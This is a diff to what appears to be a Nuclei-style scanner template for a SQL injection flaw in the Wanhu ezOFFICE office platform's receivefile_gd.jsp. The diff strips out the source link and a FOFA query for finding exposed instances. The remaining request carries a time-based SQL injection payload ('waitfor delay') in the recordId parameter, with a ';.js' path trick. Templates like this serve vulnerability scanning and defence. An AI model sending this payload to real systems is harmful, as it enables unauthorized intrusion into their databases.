@@ -3,12 +3,8 @@ info:
   name: 万户 ezOFFICE receivefile_gd.jsp SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ggp3n27bfyq8rwi1'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ggp3n27bfyq8rwi1
-    fofa: app="万户ezOFFICE协同管理平台"
 http:
 - raw:
   - 'GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=1;waitfor+delay+''0:0:6''--+- HTTP/1.1
